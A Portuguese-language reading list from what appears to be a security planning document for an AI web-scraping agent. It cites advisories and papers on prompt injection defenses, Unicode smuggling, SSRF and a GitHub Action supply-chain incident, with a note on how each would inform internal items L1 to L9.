## 5. Fontes que não consegui acessar e que valem a leitura completa

1. **Firecrawl GHSA-vjp8-2wgg-p734 (CVE-2026-32857)**: https://github.com/firecrawl/firecrawl/security/advisories/GHSA-vjp8-2wgg-p734 — é a falha de redirect no Playwright que mais se parece com a L1; ver se houve correção e qual.
2. **Defending Against Indirect Prompt Injection Attacks With Spotlighting** (Hines et al.): https://arxiv.org/pdf/2403.14720 — números exatos de datamarking e encoding por modelo, para calibrar o texto da L6.
3. **Design Patterns for Securing LLM Agents against Prompt Injections** (Beurer-Kellner et al.): https://arxiv.org/pdf/2506.08837 — os seis padrões e os 10 estudos de caso, para a seção "o que cabe ao agente" na skill e na SPEC.
4. **CaMeL: Defeating Prompt Injections by Design**: https://arxiv.org/pdf/2503.18813 — números do AgentDojo com segurança comprovável e o modelo de capacidades, para o posicionamento.
5. **Decoding Latent Attack Surfaces in LLMs: Prompt Injection via HTML in Web Summarization**: https://arxiv.org/pdf/2509.05831 — quais técnicas de ocultação funcionam (meta, aria, alt, CSS?), para priorizar as regras da L4.
6. **OpenAI, Continuously hardening ChatGPT Atlas against prompt injection**: https://openai.com/index/hardening-atlas-against-prompt-injection — como um provedor grande descreve red teaming automatizado e as defesas de produto.
7. **AWS Security Blog, Defending LLM applications against Unicode character smuggling**: https://aws.amazon.com/blogs/security/defending-llm-applications-against-unicode-character-smuggling/ — o código de saneamento recomendado (intervalos exatos e exceções de emoji) para a L4.
8. **Playwright, Network / Page.route** (doc web, para confirmar o comportamento atual de workers e popups): https://playwright.dev/python/docs/network — complementa a docstring local da L1.
9. **CISA, Supply Chain Compromise of Third-Party GitHub Action (CVE-2025-30066)**: https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-github-action-cve-2025-30066 — fonte oficial do incidente citado na L9.
10. **GitHub Docs, Workflow dependency lockfiles**: https://docs.github.com/actions/concepts/security/workflow-dependency-lockfiles — recurso novo que substitui o pinning por SHA (L9).
11. **Orange Tsai, "A New Era of SSRF"** (slides PDF no repositório do OWASP): https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_Orange_Tsai_Talk.pdf — catálogo de diferenciais de parser, útil para escrever testes extras do guard. É baixável, mas é PDF de slides e não o processei.
